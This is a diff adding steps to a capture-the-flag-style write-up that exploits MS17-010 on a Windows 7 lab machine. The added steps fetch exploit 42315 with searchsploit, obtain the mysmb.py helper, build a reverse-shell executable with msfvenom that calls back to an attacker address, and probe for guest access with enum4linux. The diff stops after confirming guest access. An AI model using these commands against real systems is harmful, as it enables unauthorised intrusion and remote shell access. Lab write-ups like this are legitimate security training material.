@@ -156,3 +156,60 @@ searchsploit ms17-010
 2. Since we're working with windows 7, let's download this one:
 
 ![image](https://user-images.githubusercontent.com/70703371/210553802-74515538-e44c-40e6-bd79-0f0d65091f96.png)
+
+
+```
+searchsploit -m 42315
+```
+
+
+![image](https://user-images.githubusercontent.com/70703371/210554128-f7c81f1a-c0b9-4039-8ffa-01978ed64d5e.png)
+
+
+3. Anyway let's try to run the script to see if there are any python requirement we need to install first.
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/210554324-943b11a3-a895-43ed-90bb-7994c09a1183.png)
+
+
+> SOLUTION - THE LINK IS COMMENTED INSIDE THE SCRIPT
+
+![image](https://user-images.githubusercontent.com/70703371/210554824-fa5a49a4-151d-46ae-95f1-a1257efec6f5.png)
+
+
+4. Since the repository is no longer available, i used this one:
+
+```
+https://github.com/worawit/MS17-010/blob/master/mysmb.py
+```
+
+5. Hence we got 2 scripts now.
+
+![image](https://user-images.githubusercontent.com/70703371/210555874-7f47e553-e85c-4ff0-9698-332d4e5bef0e.png)
+
+
+6. Next, we need to use **msfvenom** to generate a simple executeable which has reverse shell payload.
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.17 LPORT=443 -f exe > reverseShell.exe
+```
+
+> RESULT
+
+
+![image](https://user-images.githubusercontent.com/70703371/210556365-cb542630-1c0b-4676-acee-0c03d90141d9.png)
+
+
+7. Now we need to change the exploit to add credentials, since we don't have any creds, let's check with `enum4linux` whether the machine allows us to enter guest username.
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/210557036-2218b368-de11-4687-b0d7-44b598d5088c.png)
+
+
+8. Great we're allowed then.
+
+
+
+
